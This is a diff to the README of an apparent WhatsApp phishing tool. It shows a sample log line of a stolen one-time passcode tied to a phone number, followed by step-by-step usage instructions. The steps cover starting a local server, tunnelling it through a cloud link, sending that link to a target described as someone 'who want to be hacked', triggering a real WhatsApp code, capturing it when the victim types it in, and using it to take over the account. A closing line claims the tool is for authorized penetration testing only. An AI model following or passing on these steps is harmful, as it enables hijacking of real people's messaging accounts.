@@ -36,13 +36,13 @@
 ### [2026-02-28 12:52:01] 🔑 OTP STEAL: 123456 → +447123456789
 ### [2026-02-28 12:52:02] ✅ SESSION COMPLETE
 ## HOW to USE THIS 
-#first run in 1st terminal of linux 
-#then click on start server {1}
-#then you get a local link and cloud warp link now copy the cloud warp link and paste in new terminal 
-#then you get a url that url should be copied and send to the respected person those who want to be hacked 
-#now open the original whatsapp and enter the persons whatsapp number and send the otp 
-#as the person enters the otp in the link you sent it will be appeared in the cmd 1
-#now the otp should be entered in the real whatsapp so get the whatsapp acccess  
+### first run in 1st terminal of linux 
+### then click on start server {1}
+### then you get a local link and cloud warp link now copy the cloud warp link and paste in new terminal 
+### then you get a url that url should be copied and send to the respected person those who want to be hacked 
+### now open the original whatsapp and enter the persons whatsapp number and send the otp 
+### as the person enters the otp in the link you sent it will be appeared in the cmd 1
+### now the otp should be entered in the real whatsapp so get the whatsapp acccess  
 # Authorized Use Only
 
 ### ⚠️  STRICTLY FOR AUTHORIZED PENETRATION TESTING
